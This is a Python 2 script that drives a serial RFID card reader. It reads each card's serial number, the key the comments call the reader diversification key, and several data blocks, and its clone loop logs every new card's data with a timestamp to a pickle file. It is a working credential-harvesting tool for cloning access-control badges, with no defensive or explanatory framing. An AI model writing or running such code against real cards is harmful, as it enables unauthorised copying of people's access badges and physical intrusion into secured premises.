import os
import sys
import serial
import pickle
import datetime

#ser = serial.Serial(0, baudrate=57600, timeout=0.5, bytesize=serial.EIGHTBITS, parity=serial.PARITY_EVEN, stopbits=serial.STOPBITS_ONE)
ser = serial.Serial(port="/dev/ttyUSB0", baudrate=57600, timeout=0.5, bytesize=serial.EIGHTBITS, parity=serial.PARITY_EVEN, stopbits=serial.STOPBITS_ONE)



def byte_trim_11(x):
    w = x[2:-4]
    return w

def byte_trim_12(a):
    b = a[4:-4]
    return b

def hex_conv(y):
    z = y.encode("hex")
    return z

def csn_trim(c):
    d = c[2:-2]
    return d

def get_csn_div():
    ser.write("\x80\xA4\x00\x32\x09") #Select_Card
    csn = ser.read(size=12) #Receive CSN
    ser.write("\x80\x52\x00\x03\x08") # Select_Current_Key
    ser.read(size=1) #ACK
    ser.write(csn_trim(csn)) #Transmit CSN
    ser.read(size=2) #ACK
    ser.write("\x80\xC0\x00\x00\x08") #Retrieve_Data
    div_key = ser.read(size=11) #Receive Reader Diversification Key
    global csn_size
    csn_size = len(csn)
    if csn_size == 12:
        global csn_value
        csn_value =  byte_trim_12(hex_conv(csn))
        global div_key_value
        div_key_value =  byte_trim_11(hex_conv(div_key))
    else:
        pass

def get_data_blocks_pre():
    ser.write("\x80\xA4\x30\x32\x09") #Select_Card
    ser.read(size=12) #Receive CSN

def get_data_blocks(block_number):
    ser.write("\x80\xC2\xF5\x08\x02") #Transmit(Read)
    ser.read(size=1) #ACK
    ser.write(block_number) #Select Data Block 
    data_block = ser.read(size=11) #Receive Data Block
    global block_value
    block_value =  byte_trim_11(hex_conv(data_block))
 
defined_blocks = ["\x0C\x01", "\x0C\x02", "\x0C\x06", "\x0C\x07", "\x0C\x08", "\x0C\x09"]

def clone(shutdown):
    cards = set()
    current_card = []
    if os.path.exists("logs/cards_ss.p"):
        cards = pickle.load(open("logs/cards_ss.p", "rb"))
    while True:
        if shutdown.is_set():
	    sys.exit()
        time_stamp = str(datetime.datetime.now())
        current_card = []
        get_csn_div()
        if csn_size == 12:
	    current_card.extend([csn_value, div_key_value])
	    get_data_blocks_pre()
	    for i in defined_blocks:
	        get_data_blocks(i)
	        current_card.append(block_value)
        current_card_concat = ','.join(current_card)
        if len(current_card_concat) == 135:
	    if current_card_concat not in [ c[0] for c in cards]:
	        cards.add((current_card_concat,time_stamp))
                lock_file = open('logs/cards_ss.p.lck', 'w')
	        pickle.dump(cards, open('logs/cards_ss.p', 'wb'))  
                lock_file.close()
                os.remove('logs/cards_ss.p.lck')
	    else:
	        pass
